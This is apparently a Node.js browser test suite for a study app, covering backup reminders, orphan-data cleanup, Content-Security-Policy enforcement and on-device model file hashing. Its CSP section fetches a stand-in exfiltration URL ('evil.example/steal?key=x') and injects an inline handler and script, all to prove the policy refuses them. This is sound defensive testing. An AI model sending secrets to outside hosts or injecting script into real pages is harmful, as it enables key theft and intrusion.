#!/usr/bin/env node
/*
 * Your data, and what the page may do with it, in a real browser.
 *
 *   NODE_PATH=$(npm root -g) node tests/verify-memorizer-data.js
 *
 * Builds memorizer/ itself; every file here is written by the suite. Needs
 * no network.
 *
 * WHAT IS PROVEN:
 *   · home says when a backup is due; "Later" puts it off for the day, and
 *     "Back up now" makes the app's own backup (backup.js) and records the
 *     day, as Settings' export does;
 *   · an orphan an older build could leave (a pack or card whose unit is
 *     gone) is removed when the app opens, so a backup made afterwards is
 *     one the app will restore. (Backup and restore themselves, refusals
 *     included, are master's: verify-memorizer-backup-pure.js and
 *     verify-memorizer-hardening.js.)
 *   · under the page's Content-Security-Policy the browser refuses a request
 *     to any host but the ones the app uses; the policy never grants eval;
 *   · under the built page's policy an injected inline handler or <script>
 *     does not run, a script from another package on the app's CDN is
 *     refused, a flowchart is drawn by the pinned Mermaid and any other
 *     kind of Mermaid diagram is shown as text (fetches the Mermaid file);
 *   · the on-device model's files are read back from the browser's own
 *     stores, laid out as WebLLM 0.2.85 lays them out (Cache API, and
 *     IndexedDB with { url, data } records), one at a time, hashed, and a
 *     changed file refuses the model; a store the engine has not made is not
 *     made by reading it. (The download and the engine's own pre-use check
 *     need WebGPU and the network: tests/verify-memorizer.js holds the real
 *     engine to the hash format, verify-memorizer-chunk-pure.js the rest.)
 */
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const { launch } = require('./_engine');
const { onDeath, watch } = require('./_deathnote.js');

let passed = 0, failed = 0;
const ok = (label, cond, detail = '') => {
  cond ? passed++ : failed++;
  console.log((cond ? '  PASS  ' : '  FAIL  ') + label + (detail ? '  → ' + detail : ''));
};
let section = '';
const head = t => { section = t; console.log('\n── ' + t + ' ──'); };
const errors = [], events = [];
onDeath(() => ({ section, checks: passed + failed, errors, events }));

const ROOT = path.join(__dirname, '..');
const { build } = require(path.join(ROOT, 'scripts', 'build-memorizer.js'));
const MD = ['---', 'unit: Ventricular Loading', '---', '', '## Teaching Points',
  '- **Preload**: the stretch on the ventricular wall at the end of filling.',
  '- **Afterload**: the load the ventricle pumps against during ejection.', '', '## Quiz', '',
  '### Question 1', '**Stem**: Which term names the wall stretch at the end of filling?',
  '- A) Preload', '- B) Afterload', '- C) Inotropy', '- D) Compliance', '**Correct Answer**: A'].join('\n');

(async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'memorizer-data-'));
  build(dir);
  const URL = 'file://' + path.join(dir, 'index.html');
  const T = { timeout: 30000 };
  const browser = await launch();
  const fresh = async tag => {
    const ctx = await browser.newContext({ viewport: { width: 820, height: 1100 }, serviceWorkers: 'block', acceptDownloads: true });
    const p = watch(await ctx.newPage(), events, tag, errors);
    await p.goto(URL);
    await p.waitForSelector('#chip-import-study', T);
    return { ctx, p };
  };
  const toSettings = async p => {
    await p.evaluate(() => { const b = [...document.querySelectorAll('nav button, .nav-btn')].find(x => /Settings/.test(x.textContent)); b.click(); });
    await p.waitForSelector('#storage-settings', T);
  };
  const toHome = p => p.evaluate(() => { const b = [...document.querySelectorAll('nav button, .nav-btn')].find(x => /Home/.test(x.textContent)); b.click(); });
  const addUnit = async p => {
    await p.click('#chip-import-study'); await p.waitForSelector('#import-dialog', T);
    await p.setInputFiles('#import-file', { name: 'loading.md', mimeType: 'text/markdown', buffer: Buffer.from(MD) });
    await p.waitForFunction(() => !document.getElementById('import-go').disabled, null, T);
    await p.click('#import-go');
    await p.waitForSelector('#learn-unit', T);
    await toHome(p);
  };
  /* The app's day is the LOCAL day (FSRS.todayISO), and this must be too. The UTC
     day, which `toISOString().slice(0, 10)` gives, differs from it for the hours
     after local midnight wherever the offset is positive: between 00:00 and 05:00
     in Karachi both "the day remembered" checks failed, and CI, which runs in
     UTC, never saw it. src/core/fsrs.js fixed the same mistake in the app. */
  const day = () => { const d = new Date(); return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`; };
  try {
    head('the backup reminder');
    let { ctx, p } = await fresh('nudge-later');
    await addUnit(p);
    await p.waitForSelector('#backup-nudge', T);
    ok('with a unit and no backup, home says to back up, and why', /not backed up yet/.test(await p.$eval('#backup-nudge', e => e.textContent)));
    await p.click('#nudge-later');
    await p.waitForFunction(() => !document.getElementById('backup-nudge'), null, T);
    ok('"Later" puts it away for the day, remembered', await p.evaluate(() => MemStore.get('meta', 'backup-snooze').then(m => !!m && /^\d{4}-/.test(m.day))));
    await ctx.close();

    /* "Back up now" makes the app's own backup (backup.js), the one Settings
       makes: not a second format */
    ({ ctx, p } = await fresh('nudge-now'));
    await addUnit(p);
    await p.waitForSelector('#nudge-backup', T);
    /* a download that never comes is a failure here, not a crash */
    const [dl] = await Promise.all([p.waitForEvent('download', { timeout: 15000 }).catch(() => null), p.click('#nudge-backup')]);
    const file = path.join(dir, 'nudge.json');
    if (dl) await dl.saveAs(file);
    const nb = dl ? JSON.parse(fs.readFileSync(file, 'utf8')) : {};
    ok('"Back up now" saves the app’s backup, named for the day', !!dl && /^memorizer-backup-\d{4}-\d\d-\d\d\.json$/.test(dl.suggestedFilename()) &&
       nb.format === 'memorizer-backup' && /^(sha256|fnv1a64):/.test(nb.checksum) && typeof nb.payload === 'string', dl ? dl.suggestedFilename() + ' ' + Object.keys(nb).join(',') : 'no download');
    await p.waitForFunction(() => !document.getElementById('backup-nudge'), null, { timeout: 5000 }).catch(() => {});
    ok('and the reminder goes, the day remembered', await p.evaluate(() => MemStore.get('meta', 'last-backup').then(m => m && m.day)) === day());
    await ctx.close();

    head('a copy the app would not restore is handed over, not counted');
    /* A book whose chapter names a unit that is gone: what a second cut over
       a running one left (ui.js recut). The copy still holds every book and
       note, so it is downloaded; but restore() would refuse it, so no day is
       recorded and the reminder stays, saying why where the tap was. It used
       to be counted as a backup, and the reminder went quiet. */
    ({ ctx, p } = await fresh('nudge-refused'));
    await addUnit(p);
    await p.evaluate(() => MemStore.put('books', { id: 'bad-book', name: 'Invented book', parts: [], outline: [], scanned: [],
      chapters: [{ title: 'One', pageStart: 1, pageEnd: 1, docId: Memorizer.ui.docs[0].id }, { title: 'Two', pageStart: 2, pageEnd: 2, docId: 'gone-unit' }] }));
    ok('(the app itself would refuse to restore this state)', /Incomplete book/.test(await p.evaluate(() => MemBackup.exportChecked().then(r => r.problem || ''))));
    await p.waitForSelector('#nudge-backup', T);
    const [refusedCopy] = await Promise.all([p.waitForEvent('download', { timeout: 15000 }).catch(() => null), p.click('#nudge-backup')]);
    /* a precondition, not the claim: the export has finished, whichever way */
    await p.waitForFunction(() => !/Preparing/.test((document.getElementById('nudge-status') || {}).textContent || 'x'), null, T).catch(() => {});
    const refused = await p.evaluate(() => MemStore.get('meta', 'last-backup').then(m => ({ day: m ? m.day : null,
      nudge: !!document.getElementById('backup-nudge'), note: (document.getElementById('nudge-status') || {}).textContent || '' })));
    ok('the copy is still handed over, since it holds everything', !!refusedCopy);
    ok('but no backup day is recorded, so the reminder stays', refused.day === null && refused.nudge, JSON.stringify(refused));
    ok('and the reminder says why, naming the book', /would not restore it: Incomplete book: "Invented book"\./.test(refused.note), refused.note);
    await ctx.close();

    head('an orphan from an older build does not spoil a backup');
    ({ ctx, p } = await fresh('orphan'));
    await addUnit(p);
    /* what an import or delete cut short in an older build could leave: a
       pack and a card whose unit is gone */
    await p.evaluate(() => Promise.all([MemStore.put('packs', { id: 'gone-unit', sections: {} }), MemStore.put('cards', { id: 'gone-unit:0:x', docId: 'gone-unit', cluster: 0 })]));
    await p.reload();
    await p.waitForFunction(() => window.Memorizer && Memorizer.ui.docs && Memorizer.ui.docs.length === 1, null, T);
    const left = await p.evaluate(() => Promise.all([MemStore.get('packs', 'gone-unit'), MemStore.get('cards', 'gone-unit:0:x')]).then(r => r.filter(Boolean).length));
    ok('opening the app removes what no unit owns', left === 0, left + ' left');
    await toSettings(p);
    const [dl2] = await Promise.all([p.waitForEvent('download', T), p.click('#backup-export')]);
    const text = fs.readFileSync(await dl2.path(), 'utf8');
    ok('Settings’ export records the day too', await p.evaluate(() => MemStore.get('meta', 'last-backup').then(m => m && m.day)) === day());
    await ctx.close();
    ({ ctx, p } = await fresh('orphan-restore'));
    const back = await p.evaluate(t => MemBackup.inspect(t).then(r => 'restorable: ' + r.docs + ' unit', e => e.message), text);
    ok('so the backup made from it is one the app will restore (backup.js refuses data with no unit)', back === 'restorable: 1 unit', back);
    await ctx.close();

    head('what the page may do');
    /* from a web address, as on the iPad: a file:// page is its own case
       (WebKit refuses its cross-origin requests before any policy is read) */
    const server = require('http').createServer((q, r) => {
      const name = decodeURIComponent(q.url.split('?')[0]).replace(/^\/+/, '') || 'index.html';
      const file = path.join(dir, path.normalize(name));
      if (!file.startsWith(dir)) { r.statusCode = 403; return r.end(); }
      fs.readFile(file, (e, b) => { if (e) { r.statusCode = 404; return r.end(); } r.setHeader('content-type', /\.html$/.test(file) ? 'text/html; charset=utf-8' : 'application/octet-stream'); r.end(b); });
    });
    await new Promise(res => server.listen(0, '127.0.0.1', res));
    ctx = await browser.newContext({ serviceWorkers: 'block' });
    p = watch(await ctx.newPage(), events, 'csp', errors);
    await p.goto('http://127.0.0.1:' + server.address().port + '/');
    await p.waitForSelector('#chip-import-study', T);
    const sec = await p.evaluate(async () => {
      const csp = (document.querySelector('meta[http-equiv="Content-Security-Policy"]') || {}).content || '';
      /* measured by the browser's own report of what it refused: this
         sandbox has no network, so a failed fetch alone would prove nothing.
         On window: the report is fired at the document and bubbles there,
         whichever of the two an engine favours */
      const refused = [];
      window.addEventListener('securitypolicyviolation', e => refused.push(e.violatedDirective + ' ' + e.blockedURI));
      try { await fetch('https://evil.example/steal?key=x'); } catch (e) {}
      await new Promise(r => setTimeout(r, 300));
      return { csp, refused };
    });
    ok('the page carries a Content-Security-Policy that lets it talk to Anthropic', /connect-src[^;]*https:\/\/api\.anthropic\.com/.test(sec.csp), sec.csp.slice(0, 120));
    ok('the browser refuses a request to any other host under that policy: the key has nowhere else to go',
       sec.refused.some(r => /^connect-src https:\/\/evil\.example/.test(r)), JSON.stringify(sec.refused));
    /* Whether eval is refused at run time cannot be measured here: code the
       test harness injects is not held to the page's policy. What is held:
       the policy never grants it, and the app's own code does not use it. */
    ok('the policy never grants eval (only WebAssembly compilation)', !/'unsafe-eval'/.test(sec.csp) && /'wasm-unsafe-eval'/.test(sec.csp));
    /* the app's own modules, comments blanked (tests/_source.js): the files
       explain what they avoid in the words they avoid */
    const { blankComments } = require('./_source');
    const own = fs.readdirSync(path.join(ROOT, 'memorizer', 'src')).filter(f => f.endsWith('.js'))
      .filter(f => /new Function\(|[^.\w]eval\(/.test(blankComments(fs.readFileSync(path.join(ROOT, 'memorizer', 'src', f), 'utf8'))));
    ok('and the app\u2019s own code builds no function from a string', own.length === 0, own.join(', '));

    /* Script injection, under the BUILT page's policy: its inline scripts are
       allowed by hash (build-memorizer.js hashInlineScripts), which makes a
       browser ignore 'unsafe-inline', so anything else inline is refused. The
       injected markup is the page's own DOM, held to its policy, though the
       harness's evaluate() that inserts it is not. */
    const inj = await p.evaluate(async () => {
      const refused = [];
      window.addEventListener('securitypolicyviolation', e => refused.push(e.violatedDirective + ' ' + (e.blockedURI || '')));
      document.body.insertAdjacentHTML('beforeend', '<img alt="" src="data:," onerror="window.__handler = 1">');
      const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.body.appendChild(s);
      /* another package on the same CDN: the policy names the three the app
         loads, not the host, which serves any package or repository */
      const other = document.createElement('script'); other.src = 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js';
      document.body.appendChild(other);
      await new Promise(r => setTimeout(r, 500));
      return { handler: window.__handler === 1, inline: window.__inline === 1, refused };
    });
    ok('an injected inline event handler does not run: the policy\u2019s hashes leave no \u2019unsafe-inline\u2019', inj.handler === false &&
       inj.refused.some(r => /^script-src/.test(r)), JSON.stringify(inj));
    ok('nor does an injected inline <script>', inj.inline === false, JSON.stringify(inj));
    ok('a script from another package on the app\u2019s CDN is refused by the policy', inj.refused.some(r => /^script-src(-elem)? https:\/\/cdn\.jsdelivr\.net\/npm\/lodash/.test(r)), JSON.stringify(inj.refused));

    /* Mermaid: the pinned file, served here as the network would serve it,
       so its integrity hash and the page's policy both apply */
    const MERMAID_URL = /url: '(https:\/\/cdn\.jsdelivr\.net\/npm\/mermaid@[^']+)'/.exec(fs.readFileSync(path.join(ROOT, 'memorizer', 'src', 'ui.js'), 'utf8'))[1];
    const mermaidBytes = Buffer.from(await (await fetch(MERMAID_URL)).arrayBuffer());
    await p.route(MERMAID_URL, r => r.fulfill({ status: 200, body: mermaidBytes, headers: { 'content-type': 'application/javascript', 'access-control-allow-origin': '*' } }));
    const drawn = await p.evaluate(async () => {
      const flow = Memorizer.flowchart('flowchart TD\n  A["Preload"] --- B["Afterload"]');
      const seq = Memorizer.flowchart('sequenceDiagram\n  A->>B: hello');
      document.body.append(flow, seq);
      for (let i = 0; i < 200 && !flow.querySelector('svg') && !flow.querySelector('pre'); i++) await new Promise(r => setTimeout(r, 100));
      return { flow: !!flow.querySelector('svg'), flowText: flow.textContent.slice(0, 40), seqText: !!seq.querySelector('pre.chart-src'), seqSvg: !!seq.querySelector('svg'),
               loaded: [...document.scripts].some(s => /mermaid@/.test(s.src)) };
    });
    ok('a flowchart is drawn by the pinned Mermaid, its integrity and the page policy both in force', drawn.flow && drawn.loaded, JSON.stringify(drawn));
    ok('another kind of Mermaid diagram never reaches Mermaid: it is shown as its text', drawn.seqText && !drawn.seqSvg, JSON.stringify(drawn));
    await ctx.close();
    server.close();

    head('the on-device model’s files, read back where the engine keeps them');
    ({ ctx, p } = await fresh('model-files'));
    const Q = 'Qwen3-0.6B-q4f16_1-MLC';
    const crypto = require('crypto');
    const sha = t => crypto.createHash('sha256').update(t).digest('hex');
    const mf = await p.evaluate(async Q => {
      const r = MemLLM.pinnedConfig({ model_list: [{ model_id: Q, model: 'x', model_lib: 'x' }] }, 'cache').model_list[0];
      const files = { [r.model + 'params_shard_0.bin']: 'W0', [r.model + 'mlc-chat-config.json']: 'C', [r.model_lib]: 'LIB',
                      [r.model.replace(/resolve\/[0-9a-f]+\//, 'resolve/main/') + 'params_shard_0.bin']: 'OLD' };
      const store = u => /\.wasm$/.test(u) ? 'webllm/wasm' : /\.json$/.test(u) ? 'webllm/config' : 'webllm/model';
      for (const u of Object.keys(files)) await (await caches.open(store(u))).put(u, new Response(files[u]));
      const got = await MemLLM.storedFiles(Q, 'cache');
      const v = await MemLLM.verify(Q, 'cache');
      /* IndexedDB as the engine makes it: version 1, store "urls", keyed by url */
      const db = await new Promise((res, rej) => { const o = indexedDB.open('webllm/model', 1);
        o.onupgradeneeded = () => o.result.createObjectStore('urls', { keyPath: 'url' }); o.onsuccess = () => res(o.result); o.onerror = () => rej(o.error); });
      await new Promise((res, rej) => { const t = db.transaction('urls', 'readwrite');
        t.objectStore('urls').put({ url: r.model + 'params_shard_1.bin', data: new TextEncoder().encode('W1').buffer });
        t.objectStore('urls').put({ url: r.model + 'ndarray-cache.json', data: { records: [] } });
        t.oncomplete = res; t.onerror = () => rej(t.error); });
      db.close();
      const idb = await MemLLM.storedFiles(Q, 'indexeddb');
      const made = (await indexedDB.databases()).map(d => d.name).sort();
      const vi = await MemLLM.verify(Q, 'indexeddb');
      return { got, v, idb, made, vi, left: localStorage.getItem('memorizer.llm.verified.' + Q) };
    }, Q);
    const name = u => u.slice(u.lastIndexOf('/') + 1);
    ok('from the Cache API: each pinned file, hashed as it is stored', JSON.stringify(mf.got.map(f => [name(f.url), f.sha256]).sort()) ===
       JSON.stringify([['Qwen3-0.6B-q4f16_1_cs1k-webgpu.wasm', sha('LIB')], ['mlc-chat-config.json', sha('C')], ['params_shard_0.bin', sha('W0')]]), JSON.stringify(mf.got.map(f => name(f.url))));
    ok('a copy from before the pin is not one of them', !mf.got.some(f => /resolve\/main/.test(f.url)));
    ok('files that are not the manifest’s: refused, each named', mf.v.ok === false && JSON.stringify(mf.v.bad.slice().sort()) === JSON.stringify(['Qwen3-0.6B-q4f16_1_cs1k-webgpu.wasm', 'mlc-chat-config.json', 'params_shard_0.bin']), JSON.stringify(mf.v));
    ok('from IndexedDB: the bytes hashed, the parsed index left out as it cannot be', JSON.stringify(mf.idb.map(f => [name(f.url), f.sha256])) === JSON.stringify([['params_shard_1.bin', sha('W1')]]), JSON.stringify(mf.idb));
    ok('reading the engine’s stores makes none it had not made', JSON.stringify(mf.made.filter(n => /^webllm/.test(n))) === '["webllm/model"]', JSON.stringify(mf.made));
    ok('and a refusal is not remembered as a pass', mf.vi.ok === false && mf.left === null, JSON.stringify([mf.vi, mf.left]));
    await ctx.close();
  } finally {
    await browser.close();
  }
  const real = errors.filter(e => !/Content Security Policy|evil\.example|Refused to/.test(e));
  ok('no page errors (the refusals provoked above aside)', !real.length, real.join(' | '));
  console.log('\n' + passed + ' passed, ' + failed + ' failed');
  process.exit(failed ? 1 : 0);
})();
